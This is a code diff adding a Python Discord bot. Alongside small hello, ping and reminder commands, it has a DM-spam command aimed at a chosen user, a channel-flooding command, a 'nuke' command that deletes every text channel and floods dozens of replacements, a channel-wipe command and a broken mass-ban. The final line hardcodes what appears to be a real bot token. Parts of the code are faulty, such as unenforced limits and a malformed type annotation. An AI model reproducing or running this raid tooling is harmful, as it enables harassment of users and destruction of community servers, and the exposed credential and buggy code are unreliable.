@@ -1,0 +1,158 @@
+import datetime
+import time
+import json
+from discord.webhook.async_ import interaction_response_params
+import pytz
+from typing import Optional
+import discord
+from discord import guild
+from discord.abc import GuildChannel
+from discord.channel import TextChannel
+from discord.errors import Forbidden
+from discord.ext import commands
+from discord import app_commands
+import discord.utils
+
+import asyncio
+
+from discord.ext.commands.parameters import Author
+
+intents = discord.Intents.all()
+client = commands.Bot(command_prefix=".", intents=intents)
+
+
+
+
+
+
+@client.event
+async def on_ready():
+  print(f"{client.user} is working")
+  try:
+    synced = await client.tree.sync()
+    print(f"Synced {len(synced)} command(s)")
+  except Exception as e:
+    print(e)
+
+
+@client.tree.command(name="hello")
+async def hello(interaction: discord.Interaction):
+  await interaction.response.send_message(content=f"Hello!  {interaction.user.mention}!")
+
+@client.tree.command(name="ping")
+async def ping(interaction: discord.Interaction):
+    latency = round(client.latency * 1000, 2)
+    await interaction.response.send_message(content=f"Pong! Responded in {latency}ms!")
+
+@client.tree.command(name="spam-dm")
+@app_commands.describe(amount= "The amount of messages to send", username='member to spam dm', send_message="What do you want to send to this user?")
+async def spam_dm(interaction: discord.Interaction, amount: int, username: discord.User,send_message: str):
+  try:
+    if amount > 500:
+      await interaction.response.send_message(content=f"{interaction.user.mention} :warning: Amount must be less than 500 :warning:")
+    await interaction.response.send_message(content=f"Spamming {username} {amount} times!")
+    for i in range(amount):
+      await username.create_dm()
+      await username.send(f"{send_message} {username.mention}")
+      await asyncio.sleep(0.6)
+    await interaction.edit_original_response(content=f"Done spamming {username} {amount} times {interaction.user.mention}")
+  except Forbidden:
+    await interaction.edit_original_response(content=f"{interaction.user.mention} I can't spam {username} {amount} times")
+  except discord.app_commands.errors.CommandInvokeError:
+    await interaction.response.send_message(content=f"{interaction.user.mention} You are being rated limited since your breaking the bot!")
+
+
+@client.tree.command()
+@app_commands.describe(amount= "The amount of messages to send", channel='channel to send the message in', send_message="What do you want to send to this channel?")
+async def send(interaction: discord.Interaction, amount: int, channel: discord.TextChannel, send_message: str):
+  try:
+    if amount > 500:
+      await interaction.response.send_message(content=f"{interaction.user.mention} :warning: Amount must be less than 500 :warning:")
+    await interaction.response.send_message(content=f"Sending {amount} messages to {channel}!")
+    for i in range(amount):
+      await channel.send(send_message)
+      await asyncio.sleep(0.6)
+  except Exception as e:
+    print(e)
+
+
+
+
+
+from discord.ext import commands, tasks
+
+reminders = {}  # Dictionary to store reminders (user_id: (reminder_time, reminder_message))
+
+@tasks.loop(seconds=60)  # Adjust the interval based on your needs
+async def check_reminders():
+    # Get the current time
+    current_time = datetime.datetime.now()
+
+    # Loop through reminders and send messages if it's time
+    for user_id, (reminder_time, reminder_message) in list(reminders.items()):
+        if current_time >= reminder_time:
+            user = await client.fetch_user(user_id)
+            await user.send(f"Reminder: {reminder_message}")
+
+            # Remove the reminder after sending the message
+            del reminders[user_id]
+
+@client.tree.command(name="reminder", description="Set a reminder")
+@app_commands.describe(date_time="The time to set the reminder for", reminder_message="The message to send")
+async def set_reminder(interaction: discord.Interaction, date_time: "%y-%m-%", reminder_message: str):
+    user_id = interaction.user.id
+
+    # Parse the input date and time (you might need to adjust this based on the input format)
+    reminder_time = datetime.datetime.strptime(date_time, "%y-%m-%d %H:%M")
+
+    # Store the reminder in a dictionary
+    reminders[user_id] = (reminder_time, reminder_message)
+
+    # Respond to the user
+    await interaction.response.send_message(f"Reminder set for {date_time}")
+
+    # Start the task if it's not running
+    if not check_reminders.is_running():
+        check_reminders.start()
+
+@client.command()
+async def nuke(ctx, channel_names: str, channel_message):
+  await ctx.send("Nuking...")
+  try:
+    server = ctx.guild
+    text_channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]
+    for channel in text_channels:
+        await channel.delete()
+    for i in range(50):
+      new_channel = await server.create_text_channel(channel_names)
+      for j in range(10):
+        await new_channel.send(channel_message)
+        await asyncio.sleep(0.5)
+  except Forbidden:
+    await ctx.send("I can't nuke that channel")
+
+
+
+@client.command(name='delete_channels')
+async def delete_channels(ctx):
+    server = ctx.guild
+    # Get a list of all text channels in the guild
+    text_channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]
+    for channel in text_channels:
+        await channel.delete()
+
+
+  
+@client.command()
+async def mass_ban(ctx, amount: int, *, reason: str):
+  await ctx.send("Banning...")
+  try:
+    for i in range(amount):
+      await ctx.guild.ban(user=ctx.author, reason=reason)
+  except Forbidden:
+    pass
+
+
+
+
+client.run("MTE3MTUyNzk3NDcwMTQ5ODQyOQ.GyvCfa.PVVhAUl-LVBY3aZ_wnm6SFK4KyzBtVK9781q_I")
